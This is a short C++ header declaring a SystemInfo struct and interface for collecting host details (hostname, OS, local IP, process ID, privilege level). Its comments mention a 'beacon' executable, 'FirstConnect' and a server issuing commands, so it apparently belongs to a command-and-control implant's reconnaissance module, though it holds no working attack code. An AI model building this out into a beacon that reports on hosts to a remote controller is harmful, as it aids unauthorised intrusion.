#pragma once

#include <cstdint>
#include <string>
#include<memory>

namespace cleat {

	struct SystemInfo {
		std::string hostname;
		std::string os_name;
		std::string os_version;
		std::string architecture;   // "x86_64", "ARM64", "x86"
		uint64_t total_ram_bytes = 0;
		uint32_t cpu_cores = 0;
		std::string cpu_brand;
		// machine_id 已移除(身份重构④, ): 本机身份属生存层, 由
		// Core/Identity/MachineIdentity 生成并在 FirstConnect 组装时注入;
		// GetSystemInfo 命令响应不再回带 machine_id(服务端不从该命令取身份)。
		std::string local_ip;
		uint32_t pid = 0;          // 当前进程 PID
		std::string process_name;  // 可执行文件名(beacon_x64_bend)
		std::string privilege;     // 权限级别: SYSTEM / High / Medium / Low
	};

	class ISystemInfo {
	public:
		virtual ~ISystemInfo() = default;
		virtual SystemInfo GetSystemInfo() = 0;
	};

	std::unique_ptr<ISystemInfo> CreateSystemInfo();

} // namespace cleat